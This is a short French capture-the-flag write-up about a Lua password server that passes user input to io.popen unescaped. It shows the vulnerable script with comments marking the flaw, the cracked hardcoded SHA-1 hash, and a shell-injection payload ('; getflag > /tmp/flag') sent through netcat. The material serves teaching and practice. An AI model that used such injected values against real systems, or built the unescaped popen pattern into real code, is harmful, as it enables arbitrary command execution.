On a un script level11.lua:    

    #!/usr/bin/env lua
    local socket = require("socket")
    local server = assert(socket.bind("127.0.0.1", 5151)) //creer un socker avec localhost:5151

    function hash(pass)
      prog = io.popen("echo "..pass.." | sha1sum", "r") //popen exute la commande en parametre FAILLE
      data = prog:read("*all")
      prog:close()

      data = string.sub(data, 1, 40)

      return data
    end


    while 1 do
      local client = server:accept()
      client:send("Password: ")
      client:settimeout(60)
      local l, err = client:receive()
      if not err then
          print("trying " .. l)
          local h = hash(l) //sha-1 reversable

          if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then //hash hardcoder!  https://sha1.gromweb.com/?hash=f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
              client:send("Erf nope..\n");
          else
              client:send("Gz you dumb*\n")
          end

      end

      client:close()
    end

f05d1d066fb246efe0c6f7d095f909a7a0cf34a0 => NotSoEasy

On vas exploiter io.popen, qui ici execute la commande echo et la passe a sha1sum1.
Le but est de faire executer getflag. On peut passer en mot de passe la commande suivante:
    nc localhost 5151
        ; getflag > /tmp/flag